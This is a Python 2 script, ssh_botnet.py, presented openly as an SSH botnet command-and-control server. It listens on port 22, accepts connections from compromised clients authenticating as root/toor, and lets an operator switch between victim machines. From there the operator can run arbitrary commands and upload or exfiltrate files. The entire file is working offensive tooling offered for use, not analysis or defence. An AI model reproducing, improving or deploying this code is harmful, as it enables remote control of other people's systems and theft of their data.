#!/usr/bin/python
#title			:ssh_botnet.py
#description	:SIMPLE SSH BOTNET YET POWERFULL, MULTICLENT SUPPORTED AND MULTIPLATFORM, ONE SSH TO RULE THEM ALL ;)
#author			:m5a01 & haxorgirl
#date			:2017-10-26
#version		:1.0.0
#usage			:python ssh_botnet.py
#notes			:
#python_version	:2.6.6
#==============================================================================

import socket
import paramiko
import threading
import sys
import os
import argparse
import time
from SocketServer import ThreadingMixIn
from threading import Thread


banner = """ 
   _____ _____ _    _   ____   ____ _______ _   _ ______ _______ 
  / ____/ ____| |  | | |  _ \ / __ \__   __| \ | |  ____|__   __|
 | (___| (___ | |__| | | |_) | |  | | | |  |  \| | |__     | |   
   \___ \\___ \|  __  | |  _ <| |  | | | |  | . ` |  __|    | |   
  ____) |___) | |  | | | |_) | |__| | | |  | |\  | |____   | |   
 |_____/_____/|_|  |_| |____/ \____/  |_|  |_| \_|______|  |_|    
 
 ONE SSH TO RULE THEM ALL ;)
 
 Author: Mujtaba Shamas - msaneo59@gmail.com
 
"""
print banner

#parser=argparse.ArgumentParser(
 #   description='''My Description. And what a lovely description it is. ''',
  #  epilog="""All's well that ends well.""")
#parser.add_argument('-h', type=str, default='str', help='FOO!')
#parser.add_argument('bar', nargs='*', default=[1, 2, 3], help='BAR!')
#args=parser.parse_args()

if len(sys.argv) !=2:
    print "usage: %s LHOST" % (sys.argv[0])
    sys.exit(0)

ip = sys.argv[1];    
host_key = paramiko.RSAKey(filename='test_rsa.key')
 
class Server (paramiko.ServerInterface):
   def _init_(self):
       self.event = threading.Event()
   def check_channel_request(self, kind, chanid):
       if kind == 'session':
           return paramiko.OPEN_SUCCEEDED
       return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
   def check_auth_password(self, username, password):
       if (username == 'root') and (password == 'toor'):
           return paramiko.AUTH_SUCCESSFUL
       return paramiko.AUTH_FAILED


try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((ip, 22))
    sock.listen(100)
    print '[+] Listening for connection ...'
except Exception, e:
    print '[-] Listen/bind/accept failed: ' + str(e)
    sys.exit(1)
    
global diction
diction = {}

def loop_a():
    
    while True:
        try:
            client, addr = sock.accept()
            print '[+] Got a connection from ' + str(addr)
            t = paramiko.Transport(client)
            try:
                t.load_server_moduli()
            except:
                print '[-] (Failed to load moduli -- gex will be unsupported.)'
                raise
            t.add_server_key(host_key)
            server = Server()
    
            try:
                t.start_server(server=server)
            except paramiko.SSHException, x:
                print '[-] SSH negotiation failed.'
            
            global chan
            chan = t.accept(100)
            diction.update({addr[0] : chan})
            
 
        except :
            print '[-] Connection terminated'
        
def loop_b():    
    global chan
    nextcmd = ""
    data = ""
    while True:
       
        if diction:
            
            if(nextcmd == 'switch' or nextcmd == 'list'):
                data = ""
            else:
                data = chan.recv(1024)
            
            
            if data.endswith("EOFEOFEOFEOFEOFX") == True:
                print data[:-16]
            elif data.startswith("Exit") == True:
                print 'Client exit.' 
                
            nextcmd = raw_input("Enter command: ").strip('\n')    
            
            if nextcmd == 'switch':
                IP = raw_input("Enter IP:")
                chan = diction[IP]
            elif nextcmd == 'list':
                print diction.keys()[0]
            elif nextcmd == 'quit':
                sys.exit()
                
            elif nextcmd.startswith("download") == True:
                
                chan.send(nextcmd)
                downFile = nextcmd[9:]
                f = open(downFile, 'wb')
                print 'Downloading: ' + downFile
                while True:
                    l = chan.recv(1024)
                    while (l):
                        if l.endswith("EOFEOFEOFEOFEOFX"):
                            u = l[:-16]
                            f.write(u)
                            break
                        else:
                            f.write(l)
                            l = chan.recv(1024)
                    break
                f.close()
                
            elif nextcmd.startswith("upload") == True:
                
                chan.send(nextcmd)
                upFile = nextcmd[7:]
                g = open(upFile, 'rb')
                print 'Uploading: ' + upFile
                while 1:
                    fileData = g.read()
                    if not fileData: break
                    chan.sendall(fileData)
                g.close()
                time.sleep(0.8)
                chan.sendall('EOFEOFEOFEOFEOFX')
                time.sleep(0.8)
            
            else:
                chan.send(nextcmd)
                time.sleep(0.8)
                
threading.Thread(target=loop_a).start()       
threading.Thread(target=loop_b).start()                
